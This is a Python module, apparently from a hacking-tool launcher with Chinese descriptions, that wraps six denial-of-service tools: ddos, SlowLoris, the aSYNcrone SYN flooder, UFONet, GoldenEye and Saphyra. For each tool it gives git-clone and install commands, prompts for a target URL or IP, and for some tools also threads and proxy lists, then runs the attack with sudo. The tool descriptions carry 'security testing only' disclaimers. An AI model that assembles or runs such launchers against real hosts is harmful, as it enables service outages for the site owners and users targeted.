import subprocess

from rich.prompt import Prompt

from core import HackingTool, HackingToolsCollection, console


class DDoSTool(HackingTool):
    TITLE = "DDoS"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "最佳 DDoS 攻击脚本，包含 36 种以上方法。"
        "DDoS 攻击仅用于安全测试目的！"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos && sudo pip3 install -r requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos"

    def run(self):
        from config import get_tools_dir
        method     = Prompt.ask("输入方法")
        url        = Prompt.ask("输入 URL")
        threads    = Prompt.ask("输入线程数")
        proxylist  = Prompt.ask("输入代理列表")
        multiple   = Prompt.ask("输入倍数")
        timer      = Prompt.ask("输入计时器")
        # Bug 4 修复: 删除 os.system("cd ddos;") - 改用 cwd=
        subprocess.run(
            ["sudo", "python3", "ddos.py", method, url,
             "socks_type5.4.1", threads, proxylist, multiple, timer],
            cwd=str(get_tools_dir() / "ddos"),
        )


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "SlowLoris 本质上是一种 HTTP 拒绝服务攻击。"
        "它发送大量 HTTP 请求。"
    )
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = Prompt.ask("输入目标网站")
        subprocess.run(["slowloris", target_site])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | 多功能 SYN 洪水 DDoS 武器"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "aSYNcrone 是一个基于 C 语言的多功能 SYN 洪水 DDoS 武器。\n"
        "通过密集发送 SYN 数据包使目标系统瘫痪。"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone && sudo gcc aSYNcrone.c -o aSYNcrone -lpthread",
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        from config import get_tools_dir
        source_port = Prompt.ask("输入源端口")
        target_ip   = Prompt.ask("输入目标 IP")
        target_port = Prompt.ask("输入目标端口")
        # Bug 5 修复: 1000 是 int - subprocess 要求所有参数为 str
        # Bug 4 修复: 删除 os.system("cd aSYNcrone;") - 改用 cwd=
        subprocess.run(
            ["sudo", "./aSYNcrone", str(source_port), str(target_ip), str(target_port), "1000"],
            cwd=str(get_tools_dir() / "aSYNcrone"),
        )


class UFONet(HackingTool):
    TITLE = "UFOnet"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "UFONet 是一个免费的 P2P 和加密破坏性工具包，"
        "允许执行 DoS 和 DDoS 攻击。"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet && pip install --user .",
    ]
    RUN_COMMANDS = ["python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = (
        "GoldenEye 是一个 Python3 应用，仅用于安全测试目的！\n"
        "GoldenEye 是一个 HTTP DoS 测试工具。\n"
        "用法: ./goldeneye.py <url> [选项]"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/jseidl/GoldenEye.git",
        "chmod -R 755 GoldenEye",
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        from config import get_tools_dir
        # Bug 4 修复: 删除 os.system("cd GoldenEye; ...") - 无效的 cd 子 shell
        url = Prompt.ask("输入目标 URL")
        subprocess.run(["sudo", "./goldeneye.py", url],
                       cwd=str(get_tools_dir() / "GoldenEye"))


class Saphyra(HackingTool):
    TITLE = "SaphyraDDoS"
    SUPPORTED_OS = ["linux"]
    DESCRIPTION = "一个 Python DDoS 脚本，仅用于安全测试目的。"
    INSTALL_COMMANDS = [
        # Bug 7 修复: 删除 "sudo su" (第一步是进入交互式 root shell)
        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
        "chmod +x Saphyra-DDoS/saphyra.py",
    ]
    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"

    def run(self):
        from config import get_tools_dir
        url = Prompt.ask("输入 URL")
        # 漏洞 1 修复: 原来是 os.system("python saphyra.py " + url) - 命令注入
        # 现在使用 subprocess 列表形式 - url 不会被插入到 shell 字符串中
        subprocess.run(
            ["python3", "saphyra.py", url],
            cwd=str(get_tools_dir() / "Saphyra-DDoS"),
        )


class DDOSTools(HackingToolsCollection):
    TITLE = "DDoS 攻击工具"
    TOOLS = [DDoSTool(), SlowLoris(), Asyncrone(), UFONet(), GoldenEye(), Saphyra()]


if __name__ == "__main__":
    tools = DDOSTools()
    tools.show_options()
